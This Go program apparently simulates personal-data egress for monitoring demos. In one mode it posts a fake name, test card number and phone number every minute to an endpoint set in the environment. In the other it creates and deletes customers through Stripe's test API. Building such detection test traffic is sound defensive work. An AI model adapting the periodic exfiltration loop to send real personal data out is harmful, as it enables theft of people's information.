package main

import (
	"bytes"
	"crypto/tls"
	"log"
	"net/http"
	"os"
	"strings"
	"time"

	stripe "github.com/stripe/stripe-go/v72"
	"github.com/stripe/stripe-go/v72/customer"
)

const exfilPeriod = 1 * time.Minute

func runMaliciousEgress() {
	url, exists := os.LookupEnv("EGRESS_URL")
	if !exists {
		log.Fatal("Must specify EGRESS_URL in environment to run malicious egress. See README.md.")
	}

	jsonData := []byte(`{
	  "name": "Pixie Pixienaut",
	  "cc":"5105-1051-0510-5100",
	  "phone":"555-555-0100"
	}`)

	client := &http.Client{
		Transport: &http.Transport{
			TLSNextProto:       map[string]func(string, *tls.Conn) http.RoundTripper{},
			DisableCompression: true,
		},
	}

	t := time.NewTicker(exfilPeriod)
	for range t.C {
		resp, err := client.Post(url, "application/json", bytes.NewReader(jsonData))
		if err != nil {
			log.Printf("Error: %v", err)
			continue
		}
		log.Printf("POST returned code: %d", resp.StatusCode)
	}
}

func runLegitimateStripeEgress() {
	secretKey, exists := os.LookupEnv("STRIPE_TEST_API_KEY")
	if !exists {
		log.Fatal("Must specify STRIPE_TEST_API_KEY in environment to run legitimate stripe egress simulator. See README.md.")
	}
	if !strings.HasPrefix(secretKey, "sk_test") {
		log.Fatal("Must use a stripe test api key, don't use a live api key.")
	}

	stripe.Key = secretKey
	stripe.SetHTTPClient(&http.Client{
		Transport: &http.Transport{
			TLSNextProto: map[string]func(string, *tls.Conn) http.RoundTripper{},
		},
	})

	params := &stripe.CustomerParams{
		Description: stripe.String("test customer"),
		Name:        stripe.String("Pixie Pixienaut"),
		Email:       stripe.String("demo@pixielabs.ai"),
		Phone:       stripe.String("555-555-0100"),
	}

	t := time.NewTicker(exfilPeriod)
	for range t.C {
		c, err := customer.New(params)
		if err != nil {
			log.Printf("Error: %v", err)
		} else {
			log.Printf("Successfully created stripe customer")
		}
		_, _ = customer.Del(c.ID, nil)
	}

}

func main() {
	runLegit, exists := os.LookupEnv("RUN_LEGITIMATE_EGRESS")
	if !exists || runLegit != "true" {
		log.Printf("Starting malicious pii egress")
		runMaliciousEgress()
	} else {
		log.Printf("Starting legitimate stripe pii egress")
		runLegitimateStripeEgress()
	}
}
